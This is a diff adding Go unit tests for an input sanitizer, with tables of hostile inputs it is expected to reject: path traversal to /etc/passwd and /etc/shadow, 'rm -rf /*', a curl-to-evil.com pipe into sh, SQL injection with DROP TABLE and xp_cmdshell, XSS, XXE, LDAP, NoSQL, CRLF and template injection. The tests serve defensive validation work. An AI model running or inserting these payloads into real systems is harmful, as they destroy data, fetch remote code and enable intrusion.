@@ -5,6 +5,7 @@ import (
 	"os"
 	"strings"
 	"testing"
+	"time"
 )
 
 func TestDefaultSecurityConfig(t *testing.T) {
@@ -885,6 +886,364 @@ func TestInvalidDigestFormats(t *testing.T) {
 				if strings.Contains(resultImage, tt.digest) {
 					t.Errorf("Invalid digest was included in result image: %s", resultImage)
 				}
+			}
+		})
+	}
+}
+
+// TestCentralizedSanitizer tests the comprehensive input sanitizer
+func TestCentralizedSanitizer(t *testing.T) {
+	sanitizer := NewCentralizedSanitizer()
+
+	tests := []struct {
+		name      string
+		input     string
+		context   string
+		expectErr bool
+		errorType string
+	}{
+		// Path traversal tests
+		{
+			name:      "Path traversal - basic",
+			input:     "../etc/passwd",
+			context:   "file_path",
+			expectErr: true,
+			errorType: "path traversal",
+		},
+		{
+			name:      "Path traversal - encoded",
+			input:     "%2e%2e/config",
+			context:   "file_path",
+			expectErr: true,
+			errorType: "path traversal",
+		},
+		{
+			name:      "Path traversal - tilde expansion",
+			input:     "~/sensitive/file",
+			context:   "file_path",
+			expectErr: true,
+			errorType: "path traversal",
+		},
+		{
+			name:      "Path traversal - Unicode",
+			input:     "\\u002e\\u002e/root",
+			context:   "file_path",
+			expectErr: true,
+			errorType: "path traversal",
+		},
+
+		// Script injection tests
+		{
+			name:      "Script injection - HTML tags",
+			input:     "<script>alert('xss')</script>",
+			context:   "user_input",
+			expectErr: true,
+			errorType: "invalid characters",
+		},
+		{
+			name:      "Script injection - Shell commands",
+			input:     "test; rm -rf /*",
+			context:   "user_input",
+			expectErr: true,
+			errorType: "invalid characters",
+		},
+		{
+			name:      "Script injection - Backticks",
+			input:     "test`whoami`",
+			context:   "user_input",
+			expectErr: true,
+			errorType: "invalid characters",
+		},
+		{
+			name:      "Script injection - Dollar sign",
+			input:     "test$(id)",
+			context:   "user_input",
+			expectErr: true,
+			errorType: "invalid characters",
+		},
+
+		// SQL injection tests (Note: Some may be caught as script injection first)
+		{
+			name:      "SQL injection - Basic quote",
+			input:     "test' OR '1'='1",
+			context:   "target_name",
+			expectErr: true,
+			errorType: "invalid characters", // Quote is caught as script injection
+		},
+		{
+			name:      "SQL injection - Union select",
+			input:     "test UNION SELECT * FROM users",
+			context:   "target_name",
+			expectErr: true,
+			errorType: "invalid characters", // * is caught as script injection
+		},
+		{
+			name:      "SQL injection - Pure union (no dangerous chars)",
+			input:     "test union select username from users",
+			context:   "target_name",
+			expectErr: true,
+			errorType: "SQL injection", // Should be caught as SQL injection
+		},
+		{
+			name:      "SQL injection - Comment bypass",
+			input:     "test'; DROP TABLE users; --",
+			context:   "target_name",
+			expectErr: true,
+			errorType: "invalid characters", // Quote and semicolon caught first
+		},
+		{
+			name:      "SQL injection - Stored procedure",
+			input:     "test; EXEC xp_cmdshell('whoami')",
+			context:   "target_name",
+			expectErr: true,
+			errorType: "invalid characters", // Semicolon caught first
+		},
+
+		// Control character tests
+		{
+			name:      "Control characters - Null byte",
+			input:     "test\x00malicious",
+			context:   "user_input",
+			expectErr: true,
+			errorType: "invalid characters",
+		},
+		{
+			name:      "Control characters - Bell character",
+			input:     "test\x07bell",
+			context:   "user_input",
+			expectErr: true,
+			errorType: "invalid characters",
+		},
+		{
+			name:      "Control characters - Carriage return",
+			input:     "test\rmalicious",
+			context:   "user_input",
+			expectErr: true,
+			errorType: "invalid characters",
+		},
+
+		// Image reference tests
+		{
+			name:      "Image ref - Valid",
+			input:     "registry.io/myapp:v1.0.0",
+			context:   "image_ref",
+			expectErr: false,
+		},
+		{
+			name:      "Image ref - With valid digest",
+			input:     "sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+			context:   "digest",
+			expectErr: false,
+		},
+		{
+			name:      "Image ref - Invalid digest injection",
+			input:     "sha256:'; DROP TABLE images; --",
+			context:   "digest",
+			expectErr: true,
+			errorType: "invalid characters",
+		},
+		{
+			name:      "Image ref - Path traversal",
+			input:     "../../../malicious:latest",
+			context:   "image_ref",
+			expectErr: true,
+			errorType: "path traversal",
+		},
+
+		// Valid inputs
+		{
+			name:      "Valid target name",
+			input:     "my-app-123",
+			context:   "target_name",
+			expectErr: false,
+		},
+		{
+			name:      "Valid file path",
+			input:     "/opt/app/config.yaml",
+			context:   "file_path",
+			expectErr: false,
+		},
+		{
+			name:      "Valid user input",
+			input:     "scale my-app to 5 replicas",
+			context:   "user_input",
+			expectErr: false,
+		},
+		{
+			name:      "Empty input",
+			input:     "",
+			context:   "user_input",
+			expectErr: false,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := sanitizer.SanitizeInput(tt.input, tt.context)
+			if (err != nil) != tt.expectErr {
+				t.Errorf("SanitizeInput() error = %v, expectErr %v", err, tt.expectErr)
+				return
+			}
+			if tt.expectErr && tt.errorType != "" && !strings.Contains(err.Error(), tt.errorType) {
+				t.Errorf("SanitizeInput() error = %v, expected to contain %v", err, tt.errorType)
+			}
+		})
+	}
+}
+
+// TestCentralizedSanitizerAdvancedAttacks tests sophisticated attack patterns
+func TestCentralizedSanitizerAdvancedAttacks(t *testing.T) {
+	sanitizer := NewCentralizedSanitizer()
+
+	advancedTests := []struct {
+		name        string
+		input       string
+		context     string
+		expectErr   bool
+		description string
+	}{
+		// Multi-stage attacks
+		{
+			name:        "Multi-stage path traversal",
+			input:       "....//....//etc/shadow",
+			context:     "file_path",
+			expectErr:   true,
+			description: "Bypassing single dot-dot filtering",
+		},
+		{
+			name:        "LDAP injection attempt",
+			input:       "user)(|(password=*))",
+			context:     "user_input",
+			expectErr:   true,
+			description: "LDAP filter injection",
+		},
+		{
+			name:        "XML injection",
+			input:       "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
+			context:     "user_input",
+			expectErr:   true,
+			description: "XML external entity attack",
+		},
+		{
+			name:        "NoSQL injection",
+			input:       "{ $where: 'this.username == admin' }",
+			context:     "user_input",
+			expectErr:   true,
+			description: "MongoDB injection attempt",
+		},
+		{
+			name:        "CRLF injection",
+			input:       "test\r\nSet-Cookie: admin=true",
+			context:     "user_input",
+			expectErr:   true,
+			description: "HTTP header injection",
+		},
+		{
+			name:        "Command substitution",
+			input:       "$(curl http://evil.com/steal.sh | sh)",
+			context:     "user_input",
+			expectErr:   true,
+			description: "Command substitution attack",
+		},
+		{
+			name:        "Template injection",
+			input:       "{{7*7}}{{config}}",
+			context:     "user_input",
+			expectErr:   true,
+			description: "Server-side template injection",
+		},
+	}
+
+	for _, tt := range advancedTests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := sanitizer.SanitizeInput(tt.input, tt.context)
+			if (err != nil) != tt.expectErr {
+				t.Errorf("Advanced attack '%s' - SanitizeInput() error = %v, expectErr %v", tt.description, err, tt.expectErr)
+			}
+			if tt.expectErr && err != nil {
+				t.Logf("✓ Successfully blocked: %s - %s", tt.description, err.Error())
+			}
+		})
+	}
+}
+
+// TestSanitizerErrorMessages verifies standardized error messages
+func TestSanitizerErrorMessages(t *testing.T) {
+	sanitizer := NewCentralizedSanitizer()
+
+	errorTests := []struct {
+		input           string
+		context         string
+		expectedPattern string
+	}{
+		{
+			input:           "../etc/passwd",
+			context:         "file_path",
+			expectedPattern: "potential path traversal pattern",
+		},
+		{
+			input:           "test'; DROP TABLE users",
+			context:         "target_name",
+			expectedPattern: "invalid characters",
+		},
+		{
+			input:           "<script>alert(1)</script>",
+			context:         "user_input",
+			expectedPattern: "invalid characters",
+		},
+		{
+			input:           "test\x00null",
+			context:         "user_input",
+			expectedPattern: "invalid characters",
+		},
+		{
+			input:           "~/sensitive",
+			context:         "file_path",
+			expectedPattern: "potential path traversal pattern",
+		},
+		{
+			input:           "test union select password from users",
+			context:         "target_name",
+			expectedPattern: "potential SQL injection pattern",
+		},
+	}
+
+	for _, tt := range errorTests {
+		t.Run("Error message for "+tt.input, func(t *testing.T) {
+			err := sanitizer.SanitizeInput(tt.input, tt.context)
+			if err == nil {
+				t.Errorf("Expected error for input: %s", tt.input)
+				return
+			}
+			if !strings.Contains(err.Error(), tt.expectedPattern) {
+				t.Errorf("Error message '%s' does not contain expected pattern '%s'", err.Error(), tt.expectedPattern)
+			}
+		})
+	}
+}
+
+// TestSanitizerPerformance tests performance characteristics
+func TestSanitizerPerformance(t *testing.T) {
+	sanitizer := NewCentralizedSanitizer()
+
+	// Test with various input sizes
+	inputSizes := []int{10, 100, 1000, 10000}
+	
+	for _, size := range inputSizes {
+		t.Run(fmt.Sprintf("Performance test - size %d", size), func(t *testing.T) {
+			input := strings.Repeat("a", size)
+			
+			start := time.Now()
+			err := sanitizer.SanitizeInput(input, "user_input")
+			duration := time.Since(start)
+			
+			if err != nil {
+				t.Errorf("Unexpected error for clean input: %v", err)
+			}
+			
+			// Performance should be reasonable even for large inputs
+			if duration > time.Millisecond*100 {
+				t.Logf("Warning: Performance may be suboptimal for size %d: %v", size, duration)
 			}
 		})
 	}
